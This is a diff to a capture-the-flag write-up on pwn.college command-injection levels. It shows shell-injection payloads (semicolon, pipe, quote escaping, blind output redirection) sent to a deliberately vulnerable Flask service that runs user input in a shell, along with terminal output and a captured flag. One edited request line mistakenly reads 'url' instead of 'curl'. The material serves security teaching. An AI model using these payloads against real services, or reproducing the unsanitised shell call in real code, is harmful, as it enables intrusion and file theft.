@@ -189,7 +189,7 @@ If we use the semicolon `;` character, it ends the current shell statement and b
 
 ```
 ## Request:
-curl "challenge.localhost:80/mission?target=/;%20cat%20/flag%"  ==>  curl "challenge.localhost:80/mission?target=/; cat /flag"
+curl "challenge.localhost:80/mission?target=/; cat /flag"
 
 ## Resultant command:
 ls -l /;
@@ -289,7 +289,7 @@ In order to get around this we can use a PIPE (`|`) operator. It causes the outp
 
 ```
 ## Request:
-curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag"  ==>  curl "challenge.localhost:80/event?destination=/ | cat /flag"
+curl "challenge.localhost:80/event?destination=/ | cat /flag"
 
 ## Resultant command:
 ls -l / | cat /flag
@@ -364,7 +364,7 @@ We have to escape the quotes while being careful that we balance out the quotes.
 
 ```
 ## Request:
-curl "challenge.localhost:80/quest?path=/';%20cat%20/flag'"  ==>  curl "challenge.localhost:80/quest?path=/'; cat /flag'"
+curl "challenge.localhost:80/quest?path=/'; cat /flag'"
 
 ## Resultant commands:
 ls -l '/';
@@ -503,7 +503,7 @@ hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=
 
 ```
 ## Request:
-curl 'http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;%23'  ==>  curl 'http://challenge.localhost:80/exercise?zone=; cat /flag;#'
+url "http://challenge.localhost:80/exercise?zone=; cat /flag;#"
 
 ## Resultant commands:
 TZ=;
@@ -512,7 +512,7 @@ cat /flag;
 ```
 
 ```
-hacker@web-security~cmdi-4:/$ curl 'http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;#'
+hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;#"
 
         <html><body>
         Welcome to the timezone service! Please choose a timezone to get the time there.
@@ -541,10 +541,10 @@ import os
 app = flask.Flask(__name__)
 
 
-@app.route("/exercise", methods=["GET"])
+@app.route("/task", methods=["GET"])
 def challenge():
-    arg = flask.request.args.get("zone", "MST")
-    command = f"TZ={arg} date"
+    arg = flask.request.args.get("filepath", "/challenge/PWN")
+    command = f"touch {arg}"
 
     print(f"DEBUG: {command=}")
     result = subprocess.run(
@@ -557,11 +557,10 @@ def challenge():
 
     return f"""
         <html><body>
-        Welcome to the timezone service! Please choose a timezone to get the time there.
-        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
+        Welcome to the touch service! Please choose a file to touch:
+        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
         <hr>
-        <b>Output of {command}:</b><br>
-        <pre>{result}</pre>
+        <b>Ran {command}!</b><br>
         </body></html>
         """
 
@@ -571,4 +570,33 @@ os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/b
 app.secret_key = os.urandom(8)
 app.config["SERVER_NAME"] = "challenge.localhost:80"
 app.run("challenge.localhost", 80)
+```
+
+This time, tehe output of our injected command is not directly printed.
+
+### Blind command injection
+
+```
+Request:
+curl "http://challenge.localhost:80/task?filepath=; cat /flag > /home/hacker/flag"
+
+Resultant commands:
+touch ;
+cat /flag > /home/hacker/flag
+```
+
+```
+hacker@web-security~cmdi-5:/$ curl "http://challenge.localhost:80/task?filepath=;%20cat%20/flag%20>%20/home/hacker/flag"
+
+        <html><body>
+        Welcome to the touch service! Please choose a file to touch:
+        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
+        <hr>
+        <b>Ran touch ; cat /flag > /home/hacker/flag!</b><br>
+        </body></html>
+```
+
+```
+hacker@web-security~cmdi-5:/$ cat ~/flag
+pwn.college{8AaACXxDIVRIYtpf0DRFtffjDx6.ddjN1YDL4ITM0EzW}
 ```
